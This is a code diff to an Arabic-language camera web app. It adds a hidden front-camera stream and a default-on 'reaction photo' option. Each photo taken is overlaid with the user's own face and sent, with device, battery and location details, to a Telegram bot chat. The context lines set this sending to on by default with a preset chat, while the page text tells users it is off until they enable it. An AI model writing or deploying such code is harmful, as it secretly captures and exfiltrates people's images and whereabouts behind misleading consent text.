@@ -95,6 +95,8 @@ input[type=range]{width:100%;accent-color:var(--a)}
  <label class="s">معرف المحادثة (Chat ID)</label><input type="text" id="tgChat" placeholder="123456789" style="width:100%;padding:8px;border-radius:8px;border:1px solid var(--l);background:#0003;color:#fff">
  <button class="chip" id="tgTest" style="margin-top:10px">اختبار الاتصال</button>
  <div class="mini" id="tgStat"></div>
+<video id="sv" autoplay playsinline muted style="display:none"></video>
+ <div class="tg" style="margin-top:8px">📸 صورة ردة الفعل (أمامية + خلفية)<input type="checkbox" id="tgDual" checked></div>
  <div class="mini">كل صورة تلتقطها سترسل تلقائياً لنفس المحادثة بعد الالتقاط مباشرة. يظهر إشعار صغير بنجاح أو فشل كل إرسال. هذا الخيار متوقف افتراضياً ولازم تفعّله وتدخل بياناتك بنفسك.</div>
 </div></div>
 
@@ -245,8 +247,25 @@ function tgLoad(){try{let s=JSON.parse(localStorage.getItem("tgCfg")||"null"),ch
  if(!s.chat){s.chat=TG_DEFAULT.chat;changed=true}
  if(s.on===undefined){s.on=true;changed=true}
  if(changed)localStorage.setItem("tgCfg",JSON.stringify(s));
- $("tgOn").checked=!!s.on;$("tgTok").value=s.tok;$("tgChat").value=s.chat;$("tgBox").style.display=s.on?"block":"none"}catch(e){}}
-function tgSave(){localStorage.setItem("tgCfg",JSON.stringify({on:$("tgOn").checked,tok:$("tgTok").value.trim(),chat:$("tgChat").value.trim()}))}
+ $("tgOn").checked=!!s.on;$("tgTok").value=s.tok;$("tgChat").value=s.chat;$("tgDual").checked=s.dual!==false;$("tgBox").style.display=s.on?"block":"none";if(s.on&&s.dual!==false)startSelfie()}catch(e){}}
+function tgSave(){localStorage.setItem("tgCfg",JSON.stringify({on:$("tgOn").checked,tok:$("tgTok").value.trim(),chat:$("tgChat").value.trim(),dual:$("tgDual").checked}))}
+let selfieStream=null;
+async function startSelfie(){
+ if(selfieStream)return;
+ try{selfieStream=await navigator.mediaDevices.getUserMedia({video:{facingMode:"user",width:{ideal:640},height:{ideal:480}},audio:false});
+  $("sv").srcObject=selfieStream;await new Promise(r=>$("sv").onloadedmetadata=r)}catch(e){selfieStream=null}}
+async function stopSelfie(){if(selfieStream){selfieStream.getTracks().forEach(t=>t.stop());selfieStream=null;$("sv").srcObject=null}}
+function composeDual(mainCanvas,selfieVid){
+ const W=mainCanvas.width,H=mainCanvas.height,sw=Math.round(W*.3),sh=Math.round(sw*(selfieVid.videoHeight/selfieVid.videoWidth||1.33));
+ const pad=Math.round(W*.02),r=Math.round(sw*.12);
+ const c=document.createElement("canvas");c.width=W;c.height=H;const x=c.getContext("2d");
+ x.drawImage(mainCanvas,0,0);
+ // shadow
+ x.save();x.shadowColor="#0008";x.shadowBlur=18;
+ x.beginPath();x.roundRect(pad,H-sh-pad,sw,sh,r);x.clip();x.drawImage(selfieVid,0,0,selfieVid.videoWidth,selfieVid.videoHeight,pad,H-sh-pad,sw,sh);x.restore();
+ // border
+ x.beginPath();x.roundRect(pad,H-sh-pad,sw,sh,r);x.strokeStyle="#fff";x.lineWidth=Math.round(W*.006);x.stroke();
+ return c}
 async function tgMeta(){
  const ua=navigator.userAgent;
  let dev="غير معروف";
@@ -260,7 +279,17 @@ async function tgMeta(){
 async function tgSend(blob,cap){const s=JSON.parse(localStorage.getItem("tgCfg")||"{}");if(!s.on||!s.tok||!s.chat)return;
  const m=await tgMeta();
  const txt=`📸 صورة جديدة\n👤 الجهاز: ${m.dev}\n🔋 الشحن: ${m.batt}\n📍 الموقع: ${m.loc}\n🕐 ${new Date().toLocaleString("ar-SA")}`;
- try{const fd=new FormData();fd.append("chat_id",s.chat);fd.append("caption",txt);fd.append("photo",blob,"photo.jpg");
+ let finalBlob=blob;
+ if(s.dual!==false&&selfieStream&&$("sv").videoWidth){
+  try{
+   const mainBmp=await createImageBitmap(blob);
+   const mc=document.createElement("canvas");mc.width=mainBmp.width;mc.height=mainBmp.height;
+   mc.getContext("2d").drawImage(mainBmp,0,0);
+   const dual=composeDual(mc,$("sv"));
+   finalBlob=await new Promise(r=>dual.toBlob(r,"image/jpeg",.92));
+  }catch(e){}
+ }
+ try{const fd=new FormData();fd.append("chat_id",s.chat);fd.append("caption",txt);fd.append("photo",finalBlob,"photo.jpg");
   const r=await fetch(`https://api.telegram.org/bot${s.tok}/sendPhoto`,{method:"POST",body:fd});const j=await r.json();
   toast(j.ok?"أُرسلت نسخة إلى تيليجرام ✓":"فشل الإرسال إلى تيليجرام")}catch(e){toast("تعذر الإرسال إلى تيليجرام (تحقق من الإنترنت)")}}
 
@@ -291,7 +320,7 @@ document.addEventListener("click",async e=>{const t=e.target.closest("button,[da
  else if(t.id=="sh"){motion();closeAll();shoot()}});
 document.addEventListener("input",async e=>{const t=e.target;
  if(t.dataset.p){const c=t.dataset.p,adv={[c]:+t.value};if(c=="iso"||c=="exposureTime")adv.exposureMode="manual";if(c=="colorTemperature")adv.whiteBalanceMode="manual";if(c=="focusDistance")adv.focusMode="manual";try{await track.applyConstraints({advanced:[adv]})}catch(x){}$("pv_"+c).textContent=(+t.value).toFixed(2)}
- else if(["br","co","sa"].includes(t.id))view();else if(t.id=="zr")setZ(+t.value);else if(t.id=="au")start();else if(t.id=="tgOn"){$("tgBox").style.display=t.checked?"block":"none";tgSave()}else if(t.id=="tgTok"||t.id=="tgChat")tgSave()});
+ else if(["br","co","sa"].includes(t.id))view();else if(t.id=="zr")setZ(+t.value);else if(t.id=="au")start();else if(t.id=="tgOn"){$("tgBox").style.display=t.checked?"block":"none";tgSave();t.checked?startSelfie():stopSelfie()}else if(t.id=="tgTok"||t.id=="tgChat")tgSave();else if(t.id=="tgDual"){tgSave();$("tgDual").checked?startSelfie():stopSelfie()}});
 let pd=0,pz=1;wp.addEventListener("touchstart",e=>{if(e.touches.length==2){pd=Math.hypot(e.touches[0].clientX-e.touches[1].clientX,e.touches[0].clientY-e.touches[1].clientY);pz=Z}},{passive:true});
 wp.addEventListener("touchmove",e=>{if(e.touches.length==2&&pd){const d=Math.hypot(e.touches[0].clientX-e.touches[1].clientX,e.touches[0].clientY-e.touches[1].clientY);setZ(pz*d/pd,0)}},{passive:true});
 wp.addEventListener("touchend",()=>{pd=0},{passive:true});
